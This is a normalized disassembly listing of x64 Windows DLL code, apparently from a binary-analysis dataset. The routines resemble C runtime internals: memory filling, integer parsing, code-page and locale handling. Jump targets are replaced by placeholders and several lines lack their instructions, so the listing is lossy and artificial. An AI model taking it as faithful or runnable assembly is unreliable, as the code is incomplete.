inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_180008f2c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x40
mov r15 rdx
mov rdx rcx
lea rcx [ rbp - 0x20 ]
mov r13d r9d
mov r14 r8
call sub_18000643c
test r14 r14
je r-xdata
test r15 r15
jne r-xdata
mov [ r14 ] r15
test r13d r13d
je r-xdata
call sub_180006ee4
mov [ rax ] 0x16
call sub_180008e08
cmp [ rbp - 0x8 ] 0x0
jmp r-xdata
mov r12b [ r15 ]
mov r8 [ rbp - 0x20 ]
xor edi edi
lea rbx [ r15 + 0x1 ]
cmp r13d 0x2
jl r-xdata
je r-xdata
mov rax [ r8 + 0x140 ]
movzx ecx r12b
movzx eax [ rax + rcx * 2 ]
and eax 0x8
lea r8 [ rbp - 0x20 ]
movzx ecx r12b
mov edx 0x8
call sub_18000bf98
mov r8 [ rbp - 0x20 ]
jmp r-xdata
cmp r13d 0x24
jg r-xdata
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov esi [ rbp + 0x50 ]
cmp r12b 0x2d
jne r-xdata
mov r12b [ rbx ]
inc rbx
jmp r-xdata
test eax eax
je r-xdata
cmp r12b 0x2b
jne r-xdata
or esi 0x2
jmp r-xdata
cmp [ r8 + 0x10c ] 0x1
jle r-xdata
test r13d r13d
js r-xdata
mov r12b [ rbx ]
inc rbx
test r14 r14
je r-xdata
cmp r13d 0x1
je r-xdata
cmp [ rbp - 0x8 ] dil
mov [ r14 ] r15
cmp r13d 0x24
jg r-xdata
test r13d r13d
jne r-xdata
cmp r13d 0x10
jne r-xdata
cmp r12b 0x30
je r-xdata
mov r10 [ r8 + 0x140 ]
xor edx edx
or eax 0xffffffff
div r13d
mov r9d eax
cmp r12b 0x30
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0xa
jmp r-xdata
and r8d 0x103
je r-xdata
movsx ecx r12b
sub ecx 0x30
jmp r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0x10
jmp r-xdata
cmp [ rbx ] 0x58
je r-xdata
dec rbx
test sil 0x8
jne r-xdata
lea eax [ r12 - 0x61 ]
movsx ecx r12b
cmp al 0x19
ja r-xdata
cmp ecx r13d
jae r-xdata
mov r12b [ rbx + 0x1 ]
add rbx 0x2
cmp [ rbx ] 0x58
jne r-xdata
mov r13d 0x8
jmp r-xdata
mov r12d 0x7fffffff
test sil 0x4
jne r-xdata
test r14 r14
cmovne rbx r15
xor edi edi
jmp r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or esi 0x8
cmp edi r9d
jb r-xdata
call sub_180006ee4
mov [ rax ] 0x22
test sil 0x1
je r-xdata
test sil 0x1
jne r-xdata
test r14 r14
je r-xdata
imul edi r13d
add edi ecx
jne r-xdata
mov al sil
and al 0x2
neg al
sbb edi edi
neg edi
add edi r12d
or edi 0xffffffff
jmp r-xdata
mov eax esi
and eax 0x2
je r-xdata
test sil 0x2
je r-xdata
mov [ r14 ] rbx
movzx ecx r12b
movzx r8d [ r10 + rcx * 2 ]
mov ecx r8d
and ecx 0x4
je r-xdata
or esi 0x4
test r14 r14
jne r-xdata
cmp ecx edx
jbe r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
neg edi
mov r12b [ rbx ]
inc rbx
jmp r-xdata
cmp edi r12d
jbe r-xdata
mov eax edi
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
sub_180009198
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
cmp [ rw-data ] eax
mov [ rsp + 0x20 ] eax
mov rdx rcx
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_180008f2c
add rsp 0x38
retn
sub_1800091c8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8d esi
xor edx edx
call sub_180008e40
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0xc ] r11d
mov [ rbp + 0x4 ] r11
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
dec rsi
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
dec rdx
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180009254
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push rbp
lea rbp [ rax - 0x488 ]
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x470 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rcx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rcx ] al
inc eax
inc rcx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rbp + 0x470 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x270 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_18000d23c
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x70 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_18000a140
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_18000a140
lea rdx [ rbp + 0x70 ]
lea r8 [ rbp + 0x170 ]
sub rdx rsi
lea r11 [ rbp + 0x270 ]
lea rcx [ rsi + 0x1d ]
sub r8 rsi
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov eax r8d
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_180008e40
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rdx + rcx - 0x1d ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
mov al [ r8 + rcx - 0x1d ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
add r11 0x2
dec rbx
jne r-xdata
sub_180009444
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_180007a4c
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_18000c3c4
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_18000c2c4
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_18000a968
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ]
mov rbx [ rsp + 0x30 ]
[ rbx ]
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_180006da4
sub_180009500
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18000643c
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180009590
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_180009500
xor ebx ebx
mov edi eax
test eax eax
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_1800091c8
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_180008e40
lea r10 [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
shl r10 0x4
mov ebp 0x4
lea r8 [ r10 + r13 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub rbp r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
movzx eax [ rdi + rcx ]
mov [ rcx ] ax
add rcx 0x2
sub rdx r12
jne r-xdata
mov rcx rsi
call sub_180009254
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
sub r10 rsi
mov [ rsi + 0xc ] ebx
lea rcx [ rsi + 0x10 ]
lea rdi [ r10 + r13 - 0xc ]
mov edx 0x6
mov ebx 0x412
jmp r-xdata
dec edi
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_180008e40
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
dec ecx
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_180009808
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_180007a4c
mov rsi rax
call sub_180009444
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_180009500
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_18000a460
mov rbx rax
xor edi edi
test rax rax
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_180006a70
mov [ rbx ] edi
mov rdx rbx
mov ecx r12d
call sub_180009590
mov r13d eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
[ rcx ]
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ]
test [ rsi + 0xc8 ] 0x2
jne r-xdata
mov rcx [ rsi + 0xb8 ]
cmp rcx r12
je r-xdata
call sub_180006ee4
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_180006da4
test [ rw-data ] 0x1
jne r-xdata
call sub_180006da4
mov esi 0xd
mov ecx esi
call sub_18000c3c4
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
lea r8 [ __dos_header ]
mov edx edi
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x25408 ] ax
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
cmp edi 0x100
jge r-xdata
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0x1d3e0 ] al
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ]
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
mov [ rcx + r8 + 0x1d4f0 ] al
inc edi
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ]
mov ecx esi
call sub_18000c2c4
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
call sub_180006da4
sub_180009a10
[ rcx ]
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ]
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ]
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ]
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ]
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ]
retn
[ rdx ]
sub_180009a9c
test rcx rcx
je r-xdata
mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
dec r8
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_180009b40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_180006da4
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_180006da4
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_180006da4
mov rcx [ rbx + 0x130 ]
call sub_180006da4
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_18000d2bc
mov rcx [ rbx + 0x158 ]
call sub_180006da4
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
dec rsi
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180006da4
cmp [ rcx ] 0x0
jne r-xdata
call sub_180006da4
mov rcx [ rbx + 0x110 ]
call sub_180006da4
mov rcx [ rbx + 0x128 ]
call sub_180006da4
cmp [ rcx ] 0x0
jne r-xdata
call sub_180006da4
mov rcx [ rbx + 0x128 ]
call sub_18000d718
call sub_180006da4
call sub_180006da4
mov rcx [ rbx + 0x128 ]
call sub_18000d6ac
sub_180009cbc
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_180009a10
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_180009a9c
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_180009b40
sub_180009d14
push rbx
sub rsp 0x20
call sub_180007a4c
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_18000c3c4
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_180009cbc
mov rbx rax
mov ecx 0xc
call sub_18000c2c4
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_18000a968
call sub_180007a4c
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_180009d8c
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_180006220
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_180009e10
push rbx
sub rsp 0x20
test rcx rcx
je r-xdata
call sub_180006ee4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
sub r9 r8
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_180006ee4
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ r9 + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_180008e08
mov eax ebx
sub_180009e74
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov ebx [ rbp + 0x60 ]
xor edi edi
mov r14 r9
mov r15d r8d
mov [ rbp ] edx
test ebx ebx
jle r-xdata
mov r12d [ rbp + 0x78 ]
mov esi edi
test r12d r12d
jne r-xdata
mov r10d ebx
mov rax r9
neg [ rbp + 0x80 ]
mov r9d ebx
mov r8 r14
sbb edx edx
mov ecx r12d
mov [ rsp + 0x28 ] edi
and edx 0x8
mov [ rsp + 0x20 ] rdi
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r13 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov r12d [ rax + 0x4 ]
mov eax ebx
sub eax r10d
dec eax
cmp eax ebx
lea ebx [ rax + 0x1 ]
jl r-xdata
inc rax
test r10d r10d
jne r-xdata
mov r8 0xffffffffffffff0
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
dec r10d
cmp [ rax ] dil
je r-xdata
or r10d 0xffffffff
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r13
cmp rax 0x2
jb r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_180006220
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d ebx
mov r8 r14
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r13 + r13 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r14d [ rbp ]
and [ rsp + 0x28 ] esi
and [ rsp + 0x20 ] rsi
mov ecx r14d
mov r9d r13d
mov r8 rdi
mov edx r15d
call [ LCMapStringW@IAT ]
movsxd rsi eax
test eax eax
je r-xdata
call sub_180006de4
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax esi
call sub_180006da4
mov r8d 0x400
test r8d r15d
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18000a210
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax r8
test eax eax
jle r-xdata
mov ecx [ rbp + 0x70 ]
test ecx ecx
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi ecx
jg r-xdata
add rdi 0x10
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r8
ja r-xdata
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x28 ] ecx
mov r9d r13d
mov r8 rdi
mov edx r15d
mov ecx r14d
mov [ rsp + 0x20 ] rax
call [ LCMapStringW@IAT ]
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x70 ]
xor edx edx
mov [ rsp + 0x38 ] rcx
mov r9d esi
mov r8 rbx
mov [ rsp + 0x30 ] rcx
test eax eax
jne r-xdata
call sub_180006de4
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
call sub_180006da4
mov [ rsp + 0x28 ] eax
mov rax [ rbp + 0x68 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18000a210
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov esi eax
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_18000a140
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x50 ]
mov rbx r9
mov edi r8d
call sub_18000643c
mov eax [ rsp + 0xb8 ]
mov r11d [ rsp + 0xc0 ]
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] r11d
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov r9 rbx
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_180009e74
cmp [ rsp + 0x68 ] 0x0
je r-xdata
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
